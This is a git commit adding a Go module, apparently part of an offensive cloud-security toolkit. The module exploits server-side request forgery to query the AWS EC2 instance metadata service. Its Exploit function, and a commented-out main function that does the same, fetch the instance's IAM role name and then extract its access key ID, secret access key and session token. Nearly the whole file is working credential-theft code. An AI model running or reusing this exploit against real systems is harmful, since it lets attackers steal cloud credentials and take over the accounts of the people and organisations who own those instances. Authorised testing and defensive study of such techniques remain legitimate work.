2c2de6d53b12bb92d5aa047aeec5fe95ccaaf9ac
Sunny Tsai <sunny.tsai@lkc-lab.com>
2023-12-11 17:55:07 +0800

    feat: add EC2 module and exploit function
    - Added a new file `module/aws/ec2/ImdsBySsrf.go`
    - Created a new struct `Ec2` for EC2 credentials
    - Added a function `NewEC2Module` to initialize the EC2 module
    - Added a function `Exploit` to exploit the EC2 module
    - Initialized the EC2 module in the `main` function
    - Fixed a typo in a log message

---
+++ module/aws/ec2/ImdsBySsrf.go
@@ -0,0 +1,139 @@
+package aws
+
+import (
+	"encoding/json"
+	"fmt"
+	"io"
+	"net/http"
+	"os"
+)
+
+// EC2 credential
+type Ec2 struct {
+	IamRole         string
+	AccessKeyId     string
+	SecretAccessKey string
+	Token           string
+	SsrfUrl         string
+}
+
+// Get EC2 instance metadata via SSRF
+func NewEC2Module(url string) *Ec2 {
+	fmt.Println("Initializing EC2 module...")
+	return &Ec2{
+		IamRole:         "",
+		AccessKeyId:     "",
+		SecretAccessKey: "",
+		Token:           "",
+		SsrfUrl:         url,
+	}
+}
+
+func (ec2 *Ec2) Exploit() *Ec2 {
+	fmt.Println("Exploiting EC2 module...")
+	ssrfUrl := ec2.SsrfUrl
+	imdsUrl := "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+	response, err := http.Get(ssrfUrl + imdsUrl)
+	if err != nil {
+		fmt.Println("Ec2 imds http request error: ", err)
+		return ec2
+	}
+	defer response.Body.Close()
+
+	if response.StatusCode == 200 {
+		body, err := io.ReadAll(response.Body)
+		defer response.Body.Close()
+		if err != nil {
+			fmt.Println("Read response body err:", err)
+			os.Exit(1)
+		}
+		ec2.IamRole = string(body)
+
+		response, err := http.Get(ssrfUrl + imdsUrl + ec2.IamRole)
+		if err != nil {
+			fmt.Println("Ec2 imds credential http request error: ", err)
+			return ec2
+		}
+		defer response.Body.Close()
+
+		if response.StatusCode == 200 {
+			body, err := io.ReadAll(response.Body)
+			defer response.Body.Close()
+			if err != nil {
+				fmt.Println("Read response body err:", err)
+				return ec2
+			}
+
+			var credentialBody map[string]interface{}
+			if err := json.Unmarshal(body, &credentialBody); err != nil {
+				fmt.Println("Failed to get credential json value:", err)
+				return ec2
+			}
+			ec2.AccessKeyId = credentialBody["AccessKeyId"].(string)
+			ec2.SecretAccessKey = credentialBody["SecretAccessKey"].(string)
+			ec2.Token = credentialBody["Token"].(string)
+
+		} else {
+			fmt.Println("Failed to get iam role")
+			return ec2
+		}
+
+	} else {
+		fmt.Println("Failed to get iam role")
+		return ec2
+	}
+
+	return ec2
+}
+
+// func main() {
+// 	var (
+// 		ssrfEndpoint string
+// 		iamRole      string
+// 	)
+// 	parse := &cobra.Command{Use: "Get IMDS via SSRF", Long: "Get EC2 instance metadata via SSRF"}
+// 	parse.PersistentFlags().StringVarP(&ssrfEndpoint, "url", "u", "", "ssrf url")
+
+// 	if err := parse.Execute(); err != nil {
+// 		fmt.Println(err)
+// 		os.Exit(1)
+// 	}
+
+// 	getIamRole := "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+
+// 	response, err := http.Get(ssrfEndpoint + getIamRole)
+// 	if err != nil {
+// 		fmt.Println("Http request err:", err)
+// 		return
+// 	}
+// 	defer response.Body.Close()
+
+// 	if response.StatusCode == 200 {
+// 		body, err := io.ReadAll(response.Body)
+// 		defer response.Body.Close()
+// 		if err != nil {
+// 			fmt.Println("Read response body err:", err)
+// 			os.Exit(1)
+// 		}
+// 		fmt.Println("Success get iam role: ", string(body))
+// 		iamRole = string(body)
+// 	} else {
+// 		fmt.Println("Failed to get iam role")
+// 		os.Exit(1)
+// 	}
+
+// 	response, err = http.Get(ssrfEndpoint + getIamRole + iamRole)
+// 	if response.StatusCode == 200 {
+// 		body, err := io.ReadAll(response.Body)
+// 		defer response.Body.Close()
+// 		if err != nil {
+// 			fmt.Println("Read response body err:", err)
+// 			os.Exit(1)
+// 		}
+// 		fmt.Println("Success get credentials: ", string(body))
+
+// 	} else {
+// 		fmt.Println("Failed to get iam role")
+// 		os.Exit(1)
+// 	}
+// }
